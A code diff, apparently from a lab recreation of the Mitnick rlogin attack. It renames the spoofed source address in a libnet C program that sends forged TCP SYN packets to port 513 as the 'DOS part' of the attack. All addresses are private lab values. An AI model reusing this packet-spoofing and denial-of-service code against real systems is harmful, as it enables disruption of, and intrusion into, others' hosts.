@@ -11,9 +11,8 @@
 #define XTERMINAL_MAC "02:00:ac:10:10:04"
 
 //ip level data
-char * KEVIN_IP = "172.16.16.2";
+char * FAKE_IP = "172.42.42.2";
 char * SERVER_IP = "172.16.16.3";
-#define XTERMINAL_IP "172.16.16.4"
 
 //tcp level data
 #define PORT 513
@@ -41,16 +40,16 @@ int main (void)
 	//start DOS part
 	//ip conversion
 	u_long server_ip = libnet_name2addr4(l, SERVER_IP, LIBNET_DONT_RESOLVE);
-	u_long kevin_ip = libnet_name2addr4(l, KEVIN_IP, LIBNET_DONT_RESOLVE);
+	u_long fake_ip = libnet_name2addr4(l, FAKE_IP, LIBNET_DONT_RESOLVE);
 
 	if (server_ip == (u_long) -1)
 	{
 		printf("error in server ip conversion\n");
 		exit(EXIT_FAILURE);
 	}
-	if (kevin_ip == (u_long) -1)
+	if (fake_ip == (u_long) -1)
 	{
-		printf("error in kevin ip conversion\n");
+		printf("error in fake ip conversion\n");
 		exit(EXIT_FAILURE);
 	}
 
@@ -62,7 +61,7 @@ int main (void)
 	{
 		//craft and send 10 packets with "disable" payload
 		printf("enable\n");
-		send_syn(513, (uint8_t *) enable, (u_short) strlen(enable), l, server_ip, kevin_ip);
+		send_syn(513, (uint8_t *) enable, (u_short) strlen(enable), l, server_ip, fake_ip);
 	}
 	//now the server will ignore syn acks, that's exactly what I need because
 
